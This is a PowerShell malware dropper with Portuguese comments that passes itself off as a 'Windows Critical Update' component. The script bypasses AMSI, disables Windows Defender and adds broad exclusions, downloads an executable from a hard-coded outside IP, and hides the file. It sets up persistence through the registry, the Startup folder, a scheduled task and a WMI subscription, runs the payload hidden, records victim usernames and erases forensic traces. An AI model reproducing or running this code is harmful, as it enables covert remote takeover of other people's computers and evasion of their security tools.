<#
.SYNOPSIS
    Windows Critical System Component

.DESCRIPTION
    Microsoft Windows Critical Update Module

.NOTES
    Version: 10.0.19045.1
#>

# ===== CONFIGURAÇÕES =====
$serverIP = "191.178.177.175"  # MUDE PARA SEU IP
$serverPort = 500
$installName = "WinUpdateSvc"
$autoName = "GlobalMicrosoftWindowsUpdateService"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
$wallpaperPath = "$env:TEMP\wallpaper.bmp"

# ===== MUTEX =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== VERIFICAR ADMIN =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ERRO: Execute como Administrador!" -ForegroundColor Red
    Start-Sleep -Seconds 5
    exit
}

# ===== FUNÇÕES DE USUÁRIO =====
function Get-RATUsers {
    $users = @()
    if (Test-Path $userListFile) {
        $users = Get-Content $userListFile -ErrorAction SilentlyContinue
    }
    if ($users.Count -eq 0) { return "Nenhum usuário encontrado" }
    return "USUARIOS: " + ($users -join "`n")
}

function Add-UserToList {
    param([string]$userName)
    if (-not (Test-Path $userListFile)) {
        New-Item -Path (Split-Path $userListFile) -ItemType Directory -Force | Out-Null
    }
    Add-Content -Path $userListFile -Value $userName -Force
}

function Get-SystemFingerprint {
    $cpu = (Get-WmiObject Win32_Processor).Name
    $ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $disk = [math]::Round((Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").Size / 1GB, 2)
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    $user = $env:USERNAME
    $pc = $env:COMPUTERNAME
    
    return @"
═══════════════════════════════════════════════════════
SISTEMA: $user@$pc
OS: $os
CPU: $cpu
RAM: $ram GB
DISK: $disk GB
IP: $(Get-LocalIP)
═══════════════════════════════════════════════════════
"@
}

function Get-LocalIP {
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} | Select-Object -First 1).IPAddress
        return $ip
    } catch {
        return "Unknown"
    }
}

# ===== DESABILITAR DEFENDER =====
function Disable-WindowsDefender {
    Write-Host "[+] Desabilitando Windows Defender..." -ForegroundColor Yellow
    
    $commands = @(
        "Set-MpPreference -DisableRealtimeMonitoring `$true",
        "Set-MpPreference -DisableIOAVProtection `$true",
        "Set-MpPreference -DisableBehaviorMonitoring `$true",
        "Set-MpPreference -DisableBlockAtFirstSeen `$true",
        "Set-MpPreference -DisableScriptScanning `$true",
        "Set-MpPreference -SubmitSamplesConsent 2",
        "Set-MpPreference -MAPSReporting 0",
        "Add-MpPreference -ExclusionPath 'C:\'",
        "Add-MpPreference -ExclusionExtension '.exe'",
        "Add-MpPreference -ExclusionExtension '.dll'",
        "Add-MpPreference -ExclusionExtension '.ps1'"
    )
    
    foreach ($cmd in $commands) {
        try {
            Invoke-Expression $cmd -ErrorAction SilentlyContinue
        } catch {}
    }
    
    Write-Host "[✓] Defender desabilitado" -ForegroundColor Green
}

# ===== BYPASS AMSI =====
function Bypass-AMSI {
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        Write-Host "[✓] AMSI bypassado" -ForegroundColor Green
    } catch {
        Write-Host "[!] AMSI bypass falhou" -ForegroundColor Red
    }
}

# ===== DOWNLOAD PAYLOAD =====
function Download-Payload {
    param([string]$url, [string]$destination)
    
    Write-Host "[+] Baixando payload..." -ForegroundColor Yellow
    
    try {
        # Método 1: WebClient
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Microsoft-CryptoAPI/10.0")
        $webClient.DownloadFile($url, $destination)
        
        if (Test-Path $destination) {
            Write-Host "[✓] Download concluído: $(Get-Item $destination | Select-Object -ExpandProperty Length) bytes" -ForegroundColor Green
            
            # Ocultar arquivo
            $file = Get-Item $destination -Force
            $file.Attributes = 'Hidden,System'
            
            return $true
        }
    } catch {
        Write-Host "[!] Erro no download: $_" -ForegroundColor Red
    }
    
    # Método 2: Invoke-WebRequest
    try {
        Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing
        if (Test-Path $destination) {
            Write-Host "[✓] Download concluído (método 2)" -ForegroundColor Green
            return $true
        }
    } catch {}
    
    # Método 3: BITS Transfer
    try {
        Start-BitsTransfer -Source $url -Destination $destination
        if (Test-Path $destination) {
            Write-Host "[✓] Download concluído (método 3)" -ForegroundColor Green
            return $true
        }
    } catch {}
    
    return $false
}

# ===== PERSISTÊNCIA =====
function Install-Persistence {
    param([string]$exePath)
    
    Write-Host "[+] Instalando persistência..." -ForegroundColor Yellow
    
    try {
        # 1. Registry Run
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $autoName -Value $exePath -Force
        Write-Host "[✓] Registry Run configurado" -ForegroundColor Green
        
        # 2. Startup Folder
        $startupPath = [Environment]::GetFolderPath('Startup')
        $shortcutPath = Join-Path $startupPath "$autoName.lnk"
        
        $WScriptShell = New-Object -ComObject WScript.Shell
        $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = $exePath
        $shortcut.WindowStyle = 7
        $shortcut.Save()
        Write-Host "[✓] Atalho criado" -ForegroundColor Green
        
        # 3. Task Scheduler
        $action = New-ScheduledTaskAction -Execute $exePath
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        
        Register-ScheduledTask -TaskName $autoName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
        Write-Host "[✓] Tarefa agendada criada" -ForegroundColor Green
        
        # 4. WMI Event (Avançado)
        try {
            $filterName = "MicrosoftUpdateFilter"
            $consumerName = "MicrosoftUpdateConsumer"
            
            Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue | Remove-WmiObject
            Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject
            
            $query = "SELECT * FROM __InstanceModificationEvent WITHIN 1800 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
            $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
                Name = $filterName
                EventNamespace = 'root\cimv2'
                QueryLanguage = 'WQL'
                Query = $query
            }
            
            $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
                Name = $consumerName
                CommandLineTemplate = $exePath
            }
            
            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
                Filter = $filter
                Consumer = $consumer
            } | Out-Null
            
            Write-Host "[✓] WMI Event criado" -ForegroundColor Green
        } catch {
            Write-Host "[!] WMI Event falhou (normal)" -ForegroundColor Yellow
        }
        
        return $true
        
    } catch {
        Write-Host "[!] Erro na persistência: $_" -ForegroundColor Red
        return $false
    }
}

# ===== EXECUTAR PAYLOAD =====
function Start-Payload {
    param([string]$exePath)
    
    Write-Host "[+] Iniciando payload..." -ForegroundColor Yellow
    
    try {
        # Verificar se já está rodando
        $processName = [System.IO.Path]::GetFileNameWithoutExtension($exePath)
        $existing = Get-Process -Name $processName -ErrorAction SilentlyContinue
        
        if ($existing) {
            Write-Host "[!] Payload já está em execução (PID: $($existing.Id))" -ForegroundColor Yellow
            return $true
        }
        
        # Executar oculto
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $exePath
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        
        $process = [System.Diagnostics.Process]::Start($psi)
        
        Start-Sleep -Seconds 2
        
        if ($process -and !$process.HasExited) {
            Write-Host "[✓] Payload iniciado (PID: $($process.Id))" -ForegroundColor Green
            
            # Adicionar usuário à lista
            Add-UserToList $env:USERNAME
            
            return $true
        } else {
            Write-Host "[!] Processo terminou inesperadamente" -ForegroundColor Red
            return $false
        }
        
    } catch {
        Write-Host "[!] Erro ao iniciar: $_" -ForegroundColor Red
        return $false
    }
}

# ===== TROCAR WALLPAPER (OPCIONAL) =====
function Set-Wallpaper {
    param([string]$imagePath)
    
    if (-not (Test-Path $imagePath)) { return }
    
    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
        [Wallpaper]::SystemParametersInfo(0x0014, 0, $imagePath, 0x0001 -bor 0x0002)
        Write-Host "[✓] Wallpaper alterado" -ForegroundColor Green
    } catch {}
}

# ===== LIMPAR RASTROS =====
function Clear-Tracks {
    Write-Host "[+] Limpando rastros..." -ForegroundColor Yellow
    
    try {
        Clear-History
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
        Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue
        
        Write-Host "[✓] Rastros limpos" -ForegroundColor Green
    } catch {}
}

# ===== EXECUÇÃO PRINCIPAL =====
function Main {
    $host.UI.RawUI.WindowTitle = "Microsoft Windows Update Service"
    
    Clear-Host
    
    Write-Host ""
    Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host "    Microsoft Windows Critical System Component                    " -ForegroundColor White
    Write-Host "    Version 10.0.19045.1                                           " -ForegroundColor Gray
    Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host ""
    
    # Mostrar informações do sistema
    Write-Host (Get-SystemFingerprint) -ForegroundColor Gray
    Write-Host ""
    
    # Etapa 1: Bypass AMSI
    Bypass-AMSI
    
    # Etapa 2: Desabilitar Defender
    Disable-WindowsDefender
    
    # Etapa 3: Download
    $url = "http://${serverIP}:${serverPort}/WindowsUpdate.exe"
    $destination = "$env:APPDATA\Microsoft\Windows\$installName.exe"
    
    # Criar diretório
    $dir = Split-Path $destination
    if (-not (Test-Path $dir)) {
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
    }
    
    if (-not (Download-Payload -url $url -destination $destination)) {
        Write-Host ""
        Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Red
        Write-Host "    [X] FALHA: Não foi possível baixar o componente                " -ForegroundColor Red
        Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Red
        Start-Sleep -Seconds 5
        return
    }
    
    # Etapa 4: Persistência
    if (-not (Install-Persistence -exePath $destination)) {
        Write-Host "[!] Aviso: Persistência parcial" -ForegroundColor Yellow
    }
    
    # Etapa 5: Executar
    if (-not (Start-Payload -exePath $destination)) {
        Write-Host ""
        Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Red
        Write-Host "    [X] FALHA: Não foi possível iniciar o serviço                  " -ForegroundColor Red
        Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Red
        Start-Sleep -Seconds 5
        return
    }
    
    # Etapa 6: Limpar rastros
    Clear-Tracks
    
    # Mostrar usuários registrados
    Write-Host ""
    Write-Host (Get-RATUsers) -ForegroundColor Cyan
    
    Write-Host ""
    Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Green
    Write-Host "    [✓] SUCESSO: Componente instalado e ativado                     " -ForegroundColor Green
    Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Green
    Write-Host ""
    Write-Host "Pressione qualquer tecla para continuar..." -ForegroundColor Gray
    
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Executar
try {
    Main
} catch {
    Write-Host "[!] ERRO CRÍTICO: $_" -ForegroundColor Red
    Start-Sleep -Seconds 10
}
